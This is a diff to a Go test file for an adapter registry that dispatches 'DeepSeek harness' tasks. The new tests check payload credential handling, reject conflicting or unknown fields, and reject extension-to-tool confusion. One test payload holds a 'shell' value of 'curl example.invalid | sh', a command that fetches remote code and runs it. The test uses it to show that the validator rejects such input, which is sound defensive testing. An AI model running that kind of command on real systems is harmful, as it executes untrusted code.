@@ -2,6 +2,7 @@ package bootstrap
 
 import (
 	"context"
+	"encoding/json"
 	"errors"
 	"strings"
 	"testing"
@@ -31,6 +32,57 @@ func TestAdapterRegistryAcceptsVersionedDeepSeekHarnessTask(t *testing.T) {
 	}
 	if adapter.ToolID() != DeepSeekHarnessToolID || normalized.ToolVersion != task.ToolVersion {
 		t.Fatalf("unexpected resolution: %q %#v", adapter.ToolID(), normalized)
+	}
+}
+
+func TestAdapterRegistryAcceptsAdapterOwnedPayloadWithoutLegacyCredentials(t *testing.T) {
+	t.Parallel()
+	task := validVersionedTask()
+	payload, err := json.Marshal(DeepSeekHarnessPayload{APIKey: task.APIKey, Provider: task.Provider})
+	if err != nil {
+		t.Fatal(err)
+	}
+	task.Payload = payload
+	task.APIKey = ""
+	task.Provider = Provider{}
+	task.DSHVersion = ""
+	if _, _, err := DefaultAdapterRegistry().Resolve(task, "0.1.0"); err != nil {
+		t.Fatal(err)
+	}
+}
+
+func TestAdapterRegistryRejectsConflictingPayloadAndLegacyCredentials(t *testing.T) {
+	t.Parallel()
+	task := validVersionedTask()
+	payload, err := json.Marshal(DeepSeekHarnessPayload{APIKey: "different", Provider: task.Provider})
+	if err != nil {
+		t.Fatal(err)
+	}
+	task.Payload = payload
+	_, _, err = DefaultAdapterRegistry().Resolve(task, "0.1.0")
+	if err == nil || !strings.Contains(err.Error(), "conflicting payload") {
+		t.Fatalf("error = %v", err)
+	}
+}
+
+func TestAdapterRegistryRejectsUnknownToolPayloadFields(t *testing.T) {
+	t.Parallel()
+	task := validVersionedTask()
+	payload, err := json.Marshal(map[string]any{
+		"api_key":  "secret",
+		"provider": validProvider(),
+		"shell":    "curl example.invalid | sh",
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	task.Payload = payload
+	task.APIKey = ""
+	task.Provider = Provider{}
+	task.DSHVersion = ""
+	_, _, err = DefaultAdapterRegistry().Resolve(task, "0.1.0")
+	if err == nil || !strings.Contains(err.Error(), "unknown field") {
+		t.Fatalf("error = %v", err)
 	}
 }
 
@@ -153,27 +205,57 @@ func TestNewAdapterRegistryRejectsUnsafeRegistration(t *testing.T) {
 	if _, err := NewAdapterRegistry(adapter, adapter); err == nil {
 		t.Fatal("expected duplicate adapter rejection")
 	}
+	if _, err := NewAdapterRegistry(
+		stubAdapter{id: "hermes", extensions: []string{"shared-extension"}},
+		stubAdapter{id: "openclaw", extensions: []string{"shared-extension"}},
+	); err == nil {
+		t.Fatal("expected duplicate extension registration rejection")
+	}
+}
+
+func TestAdapterRegistryRejectsExtensionToolConfusion(t *testing.T) {
+	t.Parallel()
+	registry, err := NewAdapterRegistry(stubAdapter{id: "hermes", extensions: []string{"hermes"}})
+	if err != nil {
+		t.Fatal(err)
+	}
+	task := Task{
+		ExtensionID: "openclaw", ProtocolVersion: CurrentTaskProtocolVersion,
+		ToolID: "hermes", ToolVersion: "1.0.0", MinimumHelperVersion: "0.1.0",
+	}
+	_, _, err = registry.Resolve(task, "0.1.0")
+	if err == nil || !strings.Contains(err.Error(), "is not allowed to dispatch") {
+		t.Fatalf("error = %v", err)
+	}
 }
 
 type stubAdapter struct {
-	id string
+	id         string
+	extensions []string
 }
 
-func (a stubAdapter) ToolID() string    { return a.id }
+func (a stubAdapter) ToolID() string { return a.id }
+func (a stubAdapter) AllowedExtensionIDs() []string {
+	if len(a.extensions) == 0 {
+		return []string{a.id}
+	}
+	return a.extensions
+}
 func (stubAdapter) Validate(Task) error { return nil }
 func (stubAdapter) Execute(context.Context, AdapterExecution) (AdapterResult, error) {
 	return AdapterResult{}, errors.New("not implemented")
 }
 
 func validLegacyTask() Task {
-	return Task{DSHVersion: "0.1.0-rc.6", Provider: validProvider()}
+	return Task{ExtensionID: DefaultExtensionID, DSHVersion: "0.1.0-rc.6", APIKey: "secret", Provider: validProvider()}
 }
 
 func validVersionedTask() Task {
 	return Task{
+		ExtensionID:     DefaultExtensionID,
 		ProtocolVersion: CurrentTaskProtocolVersion, ToolID: DeepSeekHarnessToolID,
 		ToolVersion: "0.1.0-rc.6", MinimumHelperVersion: "0.1.0", DSHVersion: "0.1.0-rc.6",
-		Provider: validProvider(),
+		APIKey: "secret", Provider: validProvider(),
 	}
 }
 
